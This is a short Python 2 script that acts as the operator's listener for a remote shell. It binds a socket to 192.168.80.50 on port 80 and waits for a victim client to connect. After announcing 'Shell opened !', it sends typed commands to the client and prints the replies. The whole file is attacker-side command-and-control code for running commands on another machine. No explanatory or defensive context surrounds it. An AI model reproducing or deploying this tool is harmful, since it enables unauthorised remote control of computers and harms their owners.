import socket
import time
import os

j=1

while True:
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		print "Socket create succesful!"
		break
	except:
			print "failed to create socket, trying again in: 5"
			time.sleep(1)
			os.system("cls")
			print "failed to create socket, trying again in: 4"
			time.sleep(1)
			os.system("cls")
			print "failed to create socket, trying again in: 3"
			time.sleep(1)
			os.system("cls")
			print "failed to create socket, trying again in: 2"
			time.sleep(1)
			os.system("cls")
			print "failed to create socket, trying again in: 1"
			time.sleep(1)
			os.system("cls")

while True:
	try:
		s.bind(('192.168.80.50', 80))
		print "Socket Bind succesful!"
		break
	except:

		print "failed to bind socket! Try: " + str(j)
		time.sleep(1)
		j+=1

print "Waiting for client..."		
s.listen(10)
conn, addr = s.accept()
print "Client connectet: " + addr[0]
print("Shell opened !")
while True:

	cmd= raw_input("Cmd> ")
	data = conn.send(cmd)
	
	back=conn.recv(1024)
	print back
	
